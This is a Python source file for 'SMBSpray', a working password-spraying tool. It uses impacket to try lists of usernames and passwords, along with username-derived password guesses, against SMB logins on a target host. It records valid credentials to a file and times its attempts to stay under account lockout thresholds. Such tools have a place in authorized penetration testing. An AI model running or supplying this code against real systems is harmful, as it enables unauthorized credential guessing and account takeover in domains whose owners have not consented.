#!/usr/bin/env python3

import datetime
import argparse
import os
import sys
from impacket.smbconnection import SMBConnection, SessionError
from time import sleep
from termcolor import colored
from math import floor

# log files
spray_logs = "spray_logs.txt"
valid_creds = "valid_creds.txt"
attempted = "attempted_pws.txt"

# smb errors list - stolen from CME
smb_error_status = [
    "STATUS_ACCOUNT_DISABLED",
    "STATUS_ACCOUNT_EXPIRED",
    "STATUS_ACCOUNT_RESTRICTION",
    "STATUS_INVALID_LOGON_HOURS",
    "STATUS_INVALID_WORKSTATION",
    "STATUS_LOGON_TYPE_NOT_GRANTED",
    "STATUS_PASSWORD_EXPIRED",
    "STATUS_PASSWORD_MUST_CHANGE",
    "STATUS_ACCESS_DENIED"
]

smb_error_locked = "STATUS_ACCOUNT_LOCKED_OUT"


# login to smb function
def login(username, password, domain, host, verbose=False, unsafe=False):
    global locked_users
    desc = ""
    with open(spray_logs, "a+") as sf:
        try:
            smbclient = SMBConnection(host, host, sess_port=445)
            if domain:
                conn = smbclient.login(username, password, domain)
            # if domain isn't supplied get it from the server    
            else:
                conn = smbclient.login(username, password, domain)
                domain = smbclient.getServerDNSDomainName()
            if conn:
                message = get_pretty_time("success") +"{}\{}:{} ".format(domain,username,password) + colored("(Successful!)","green")
                with open(valid_creds, "a+") as f:
                    f.write(domain + "\\" + username + ":" + password + "\r\n")
        # impacket smb session error handling
        except SessionError as e:
            error, desc = e.getErrorString()
            if not domain:
                domain = smbclient.getServerDNSDomainName()
            message = "{}\{}:{} ".format(domain,username,password)
            if error in smb_error_status:
                message = get_pretty_time("warn")+ message + colored(error,"yellow")
            elif error == smb_error_locked:
                message = get_pretty_time("danger") + message + colored(error,"red")
                locked_users.add(username)
                # after 3 locked accounts exit
                if not unsafe and len(locked_users) == 3:
                    print(message)
                    print(colored("[!] Exiting due to multiple locked accounts!", "red"))
                    sys.exit()
            else:
                message = get_pretty_time() + message + error
        print(message)
        if verbose and desc:
                print(desc)
        sf.write(message + "\r\n")

# formats the datetime and colors it
def get_pretty_time(level=None):
    formatted_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if level == "success":
        pretty_time = colored("[+] {}\t\t ".format(formatted_date), "green")
    elif level == "warn":
        pretty_time = colored("[*] {}\t\t ".format(formatted_date), "yellow")
    elif level == "danger":
        pretty_time = colored("[!] {}\t\t ".format(formatted_date), "red")
    else:
        pretty_time = "[-] {}\t\t ".format(formatted_date)
    return pretty_time

# function to spray password
def try_password(users, password, option=None):
    global i
    i += 1
    print(get_pretty_time("warn") + colored("Trying password {} of {}".format(i, total_passwords), "yellow"))
    # username as password variation all lowercase
    if option == "lower":
        for user in users:
            login(user, user.lower(), domain, host, verbose, unsafe)
        check_for_naptime(i)
    # username as password variation all uppercase
    elif option == "upper":
        for user in users:
            login(user, user.upper(), domain, host, verbose, unsafe)
        check_for_naptime(i)
    # username as password variation captilalize first letter and append !
    elif option == "capital":
        for user in users:
            login(user, user.capitalize() + "!", domain, host, verbose, unsafe)
        check_for_naptime(i)
    # default behavior to try password spray
    else:
        for user in users:
            login(user, password, domain, host, verbose, unsafe)
        check_for_naptime(i)

# checks to sleep based off attempt try
def check_for_naptime(i):
    if (i % attempts == 0) and (i != total_passwords):
        print(get_pretty_time("warn") + colored("Sleeping for {} minutes".format(lockout_period),"yellow"))
        sleep(lockout_period * 60)

def main():
    banner = "\nSMBSpray v1.0\n"
    print(banner)

    parser = argparse.ArgumentParser(description='Parse Spray Arguments.')
    parser.add_argument('-u', metavar="users", help="User list to spray", type=str)
    parser.add_argument('-U', metavar="user", help="Single user to spray", type=str)
    parser.add_argument('-p', metavar="passwords", help="Password list to spray", type=str)
    parser.add_argument('-P', metavar="password", help="Single password to spray", type=str)
    parser.add_argument('-d', metavar="domain", help="Domain", type=str)
    parser.add_argument('-l', metavar="lockout period", help="Lockout policy period in minutes", type=int)
    parser.add_argument('-a', metavar="attempts", help="Number of attempts per lockout period", type=int)
    parser.add_argument('-ip', metavar="IP/hostname", help="IP/hostname to spray", required=True, type=str)
    parser.add_argument('--verbose', help="Verbose Mode", action='store_true')
    parser.add_argument('--user_pw', help="Try username variations as password", action='store_true')
    parser.add_argument('--unsafe', help="Keep spraying even if there are multiple account lockouts", action='store_true')
    
    args = parser.parse_args()
    if len(sys.argv) == 1:
            parser.print_help()

    global domain
    global host
    global verbose
    global attempts 
    global total_passwords
    global lockout_period
    global i
    global unsafe 
    global locked_users
    domain = args.d 
    host = args.ip 
    verbose = args.verbose
    attempts = args.a
    lockout_period = args.l
    unsafe = args.unsafe
    user_list = []
    password_list = []
    locked_users = set()
    i = 0

    if not args.u and not args.U:
        print(colored("[!] No users to spray... exiting", "red"))
        sys.exit()
    
    if not args.p and not args.P:
        print(colored("[!] No passwords to spray... exiting", "red"))
        sys.exit()
    
    if not domain:
        domain = ""

    # set default to 1 attempt every 30 minutes if not set
    if not lockout_period:
        lockout_period = 30
    
    if not attempts:
        attempts = 1

    # append users to list
    if args.u:
        with open(args.u, "r") as user_file:
            for line in user_file:
                user_list.append(line.strip())
    
    # append passwords to list
    if args.p:
        with open(args.p, "r") as password_file:
            for line in password_file:
                password_list.append(line.strip())

    # append single user to list
    if args.U:
        user_list.append(args.U)
    
    # append single password to list
    if args.P:
        password_list.append(args.P)

    # check if password has been attempted from log file, if so remove it
    if os.path.exists(attempted):
        with open(attempted, "r") as pf:
            tried_passwords = pf.read().splitlines()
            for tried_password in tried_passwords:
                if tried_password in password_list:
                    password_list.remove(tried_password)
                    print(colored("[*] {} already attempted, removed from spray list".format(tried_password), "yellow"))

    
    total_passwords = len(password_list)

    # add three total passwords to try for username variations
    if args.user_pw:
        total_passwords += 3
    
    if total_passwords == 0:
        print(colored("[!] No passwords to spray... exiting", "red"))
        sys.exit()

    # ugly math for rough estimate of time to completion
    mathz1 = floor((total_passwords / attempts))
    if mathz1 == 1:
        mathz = lockout_period * mathz1
    else:
        mathz = lockout_period * mathz1 - lockout_period

    print(colored("[*] Attempting {} passwords every {} minutes for {} total passwords".format(attempts, lockout_period, total_passwords),"yellow"))
    if total_passwords <= attempts:
        print(colored("[*] This will run to completion without sleeping", "yellow"))
        input(colored("[*] Press Enter to proceed","yellow"))
    else: 
        print(colored("[*] This will take just over {} minutes to complete".format(mathz),"yellow"))
        input(colored("[*] Press Enter to proceed","yellow"))

    # do username variations as passwords
    if args.user_pw:
        print(get_pretty_time("warn") + colored("Trying username password variations","yellow"))
        try_password(user_list,"", option="lower")
        try_password(user_list,"", option="upper")
        try_password(user_list,"", option="capital")

    # iterate through passwords list
    if password_list:
        for passwd in password_list:
            try_password(user_list, passwd)
            # after iterating through all users, write attempted password to file
            with open(attempted, "a+") as pf:
                pf.write(passwd + "\n")

try:
    main()
except Exception as e:
    print(colored("[!] Error: {}".format(e),"red"))